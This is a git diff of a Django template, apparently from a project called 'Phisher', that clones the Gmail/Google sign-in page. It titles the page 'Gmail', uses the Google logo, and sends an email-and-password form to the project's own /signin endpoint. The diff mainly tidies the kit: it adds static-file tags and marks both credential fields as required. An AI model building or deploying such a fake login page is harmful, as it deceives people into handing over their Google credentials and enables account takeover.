@@ -1,3 +1,4 @@
+{% load static %}
 <!DOCTYPE html>
 <html lang="en">
 <!-- Created By Manoj Kashyap R dont remove this credit line thank you-->
@@ -7,6 +8,7 @@
   <meta content="width=300, initial-scale=1" name="viewport">
   <meta name="jingle" value="notranslate">
   <meta name="description" content=".">
+  <link rel="icon" href="{% static 'Phisher/images/favicon.ico' %}">
   <title>Gmail</title>
 <style>
   html, body {
@@ -141,7 +143,7 @@
   border-radius: 1em;
   }
   input[type=checkbox]:checked::after {
-  content: url(../ssl.gstatic.com/ui/v1/menu/checkmark.png);
+  content: url(https://ssl.gstatic.com/ui/v1/menu/checkmark.png);
   display: block;
   position: absolute;
   top: -6px;
@@ -943,7 +945,7 @@ body.friendly .btn {
   <div class="wrapper">
   <div class="google-header-bar  centered">
   <div class="header content clearfix">
-      <img alt="Google" class="logo" src="/static/images/google.png" style="height:50px;">
+      <img alt="Google" class="logo" src="{% static 'Phisher/images/google.png' %}" style="height:50px;">
   </div>
   </div>
   <div class="main content clearfix">
@@ -956,17 +958,16 @@ body.friendly .btn {
   </h2>
 </div>
 <div class="card signin-card clearfix">
-<img class="profile-img" src="/static/images/avatar.png" alt="avatar">
+<img class="profile-img" src="{% static 'Phisher/images/avatar.png' %}" alt="avatar">
 <p class="profile-name"></p>
   <form method="post" action="/signin">
     {% block csrf %}
 
-    
     {% endblock csrf %}
 <label class="hidden-label" for="Email">Email</label>
-<input id="Email" name="email" type="email" placeholder="Email" value="" spellcheck="false" class="">
+<input id="Email" name="email" type="email" placeholder="Email" value="" spellcheck="false" class="" required="True">
 <label class="hidden-label" for="Passwd">Password</label>
-<input id="Passwd" name="password" type="password" placeholder="Password" class="">
+<input id="Passwd" name="password" type="password" placeholder="Password" class="" required="True">
 <input id="signIn" name="signIn" class="rc-button rc-button-submit" type="submit" value="Sign in">
   <label class="remember">
   <input type="checkbox" value="yes" checked="checked">
@@ -1014,7 +1015,7 @@ body.friendly .btn {
   </ul>
   <div id="lang-vis-control" style="display: inline;">
   <span id="lang-chooser-wrap" class="lang-chooser-wrap">
-      <label for="lang-chooser"><img src="/static/images/images.png" alt="Change language"></label>
+      <label for="lang-chooser"><img src="{% static 'Phisher/images/images.png' %}" alt="Change language"></label>
   <select id="lang-chooser" class="lang-chooser" name="lang-chooser">
   <option value="en-US">
   English (United States)
